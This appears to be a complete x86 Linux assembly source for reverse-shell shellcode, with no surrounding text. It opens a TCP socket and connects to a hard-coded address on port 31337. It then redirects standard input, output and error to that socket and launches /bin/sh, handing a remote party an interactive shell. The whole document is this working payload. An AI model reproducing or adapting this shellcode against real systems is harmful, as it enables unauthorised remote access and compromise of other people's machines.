


global _start
section .text
_start:

    xor eax,eax
    mov al,0x66 ; socketcall()
    xor ebx,ebx
    mov bl,0x1 ; socketcall(1 [socket],

    push 0x6    ; tcp (IANA - standard)
    push 0x1    ; SOCK_STREAM
    push 0x2    ; AF_INET
    mov ecx,esp
    int 0x80
    mov edx,eax
    pop eax
    pop eax
    pop eax
    ;pop eax
    xor eax,eax
    push eax
    mov al,0x66
    push 0x0101017f ;  ip
    push word 0x697a     ; 31337 port
    push word 0x2        ; sin_family_
    mov ecx,esp
    push 0x10
    push ecx
    push edx
    mov ecx,esp

    xor ebx,ebx
    mov bl,0x3
    int 0x80
    mov edi,eax

    xor eax,eax
    mov al,63
    mov ebx,edx
    xor ecx,ecx
    mov cl,0x2
    int 0x80

    xor eax,eax
    mov al,63
    mov ebx,edx
    dec ecx
    int 0x80

    xor eax,eax
    mov al,63
    mov ebx,edx
    dec ecx
    int 0x80


    xor ebx,ebx
    push ebx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx,esp
    xor eax,eax
    mov cl,al
    mov dl,al

    xor eax,eax
    mov al,0xb
    int 0x80


